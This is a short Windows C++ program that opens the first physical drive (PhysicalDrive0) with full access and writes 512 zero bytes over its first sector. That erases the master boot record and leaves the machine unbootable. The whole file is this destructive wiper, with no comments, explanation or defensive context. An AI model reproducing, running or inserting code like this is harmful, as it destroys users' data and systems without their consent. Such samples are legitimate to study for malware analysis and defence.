
#include<iostream>
#include<windows.h>

int main(void)
{
    char MBRData[512];
    ZeroMemory(&MBRData, (sizeof MBRData));

    LPCWSTR PATH = L"\\\\.\\PhysicalDrive0";

    HANDLE MBR = CreateFile(PATH, GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
    DWORD WRITE;

    WriteFile(MBR, MBRData, 512, &WRITE, NULL);
    CloseHandle(MBR);
};
